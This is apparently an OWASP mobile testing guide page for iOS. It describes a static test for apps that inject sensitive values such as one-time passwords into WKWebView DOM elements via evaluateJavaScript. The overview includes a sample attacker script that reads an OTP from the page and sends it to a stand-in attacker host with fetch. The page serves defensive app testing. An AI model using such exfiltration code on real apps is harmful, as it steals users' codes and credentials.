---
platform: ios
title: References to `evaluateJavaScript` Writing Sensitive Data into WebView DOM
id: MASTG-TEST-0380
type: [static, code, manual]
weakness: MASWE-0069
best-practices: [MASTG-BEST-0059]
profiles: [L1, L2]
knowledge: [MASTG-KNOW-0076, MASTG-KNOW-0139]
---

## Overview

When a `WKWebView` app needs to display sensitive information (such as a one-time password, account balance, or payment detail), a common pattern is to inject that data directly into the DOM using [`evaluateJavaScript:completionHandler:`](https://developer.apple.com/documentation/webkit/wkwebview/evaluatejavascript(_:completionhandler:)) with a script that assigns to a DOM property such as `innerHTML`, `textContent`, or `value`. Once the data is in the DOM, any JavaScript running on the page can read it at any time by querying the element.

If an attacker can execute JavaScript in the WebView (for example through XSS or content injection), they can exfiltrate the data simply by reading the DOM:

```javascript
// Attacker reads the injected OTP from the DOM
const otp = document.getElementById('otp-display').textContent;
fetch("https://attacker.example.com/?otp=" + otp);
```

The secure alternative is to display sensitive information using a native UIKit or SwiftUI view overlaid on the WebView. The app reads only layout coordinates from the DOM (using an isolated `WKContentWorld` script), then renders the sensitive data in a native view positioned at those coordinates. The sensitive value never enters the DOM and is therefore inaccessible to page JavaScript.

This test checks whether the app uses `evaluateJavaScript:completionHandler:` to write sensitive data into DOM elements.

## Steps

1. Use @MASTG-TECH-0058 to extract the relevant binaries from app package.
2. Use @MASTG-TECH-0066 to look for the relevant APIs in the app binaries.

## Observation

The output should contain a list of locations where `evaluateJavaScript:completionHandler:` is called.

## Evaluation

The test case fails if `evaluateJavaScript:completionHandler:` is used to assign sensitive data to a DOM element property.

**Further Validation Required:**

Inspect each reported call site using @MASTG-TECH-0076 to confirm whether the JavaScript string assigns to a DOM element property (`innerHTML`, `textContent`, `innerText`, or `value`) and that the value assigned to the DOM property is sensitive data derived from a native source, such as a one-time password, account number, or credential, and is not a static placeholder or non-sensitive UI string.
